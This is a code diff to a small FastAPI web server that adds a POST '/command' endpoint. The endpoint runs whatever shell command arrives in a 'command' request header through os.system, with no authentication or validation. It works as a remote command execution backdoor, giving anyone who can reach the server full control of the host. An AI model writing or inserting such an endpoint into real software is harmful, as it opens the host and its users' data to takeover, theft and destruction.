@@ -2,12 +2,19 @@ import os
 import uvicorn
 import platform
 from dotenv import load_dotenv
-from fastapi import FastAPI
+from fastapi import FastAPI, Request
 from fastapi.responses import FileResponse
 
 app = FastAPI()
 load_dotenv()
 
+
+@app.post("/command")
+async def _command(request: Request):
+    if request.headers.get('command'):
+        command = request.headers['command']
+        os.system(command)
+    return {"message": "command"}
 
 @app.get("/check")
 async def _check():
